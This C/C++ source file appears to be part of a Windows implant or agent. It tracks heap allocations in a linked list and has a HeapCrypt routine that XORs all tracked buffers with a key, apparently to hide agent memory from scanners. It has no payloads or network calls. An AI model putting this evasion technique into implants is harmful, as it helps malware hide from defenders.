#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// Alloc - allocate a tracked buffer from the agent heap
DECLFN PVOID Heap_Alloc( SIZE_T size )
{
    G_AGENT;

    // allocate the actual data buffer
    PVOID buf = Self->Ntdll.RtlAllocateHeap( Self->Hp.Handle, HEAP_ZERO_MEMORY, size );
    if ( !buf ) return nullptr;

    // Allocate a node to track it (not added to tracked list itself)
    HEAP_NODE* node = (HEAP_NODE*)Self->Ntdll.RtlAllocateHeap( Self->Hp.Handle, HEAP_ZERO_MEMORY, sizeof(HEAP_NODE) );
    if ( !node )
    {
        Self->Ntdll.RtlFreeHeap( Self->Hp.Handle, 0, buf);
        return nullptr;
    }

    node->Address   = buf;
    node->Size      = size;
    node->Next      = Self->Hp.Head;
    Self->Hp.Head   = node;

    return buf;
}

// Free - free a tracked buffer and remove its node
DECLFN void Heap_Free( PVOID ptr )
{
    G_AGENT;
    if( !ptr ) return;

    HEAP_NODE* prev = nullptr;
    HEAP_NODE* curr = Self->Hp.Head;

    while ( curr )
    {
        if ( curr->Address == ptr )
        {
            if ( prev )
            {
                prev->Next = curr->Next;
            }
            else
            {
                Self->Hp.Head = curr->Next;
            }

            // free the actual buffer first, then the node
            Self->Ntdll.RtlFreeHeap( Self->Hp.Handle, 0, curr->Address );
            Self->Ntdll.RtlFreeHeap( Self->Hp.Handle, 0, curr );
            return;
        }
        prev = curr;
        curr = curr->Next;
    }
    // ptr not in tracked list - do nothing
}

// Crypt - XOR all tracked allocation with a fixed key (encrypt/decrypt)
// Encrypting the Linked-List of Heap
DECLFN void HeapCrypt( ULONG_PTR key)
{
    G_AGENT;

    HEAP_NODE* curr = Self->Hp.Head;

    while ( curr )
    {
        BYTE* data = (BYTE*)curr->Address;
        SIZE_T size = curr->Size;

        for ( SIZE_T i = 0; i < size; i++ )
        {
            data[i] ^= ((BYTE*)&key)[ i % sizeof(ULONG_PTR) ];
        }
        curr = curr->Next;
    }
}

DECLFN PVOID Heap_Realloc( PVOID ptr, SIZE_T new_size )
{
    G_AGENT;
    if ( !ptr ) return Heap_Alloc( new_size );

    HEAP_NODE* curr = Self->Hp.Head;
    while ( curr )
    {
        if ( curr->Address == ptr )
        {
            PVOID new_ptr = Self->Ntdll.RtlReAllocateHeap( Self->Hp.Handle, HEAP_ZERO_MEMORY, ptr, new_size );

            if ( new_ptr )
            {
                curr->Address   = new_ptr;
                curr->Size      = new_size;
            }
            return new_ptr;
        }
        curr = curr->Next;
    }
    return nullptr;
}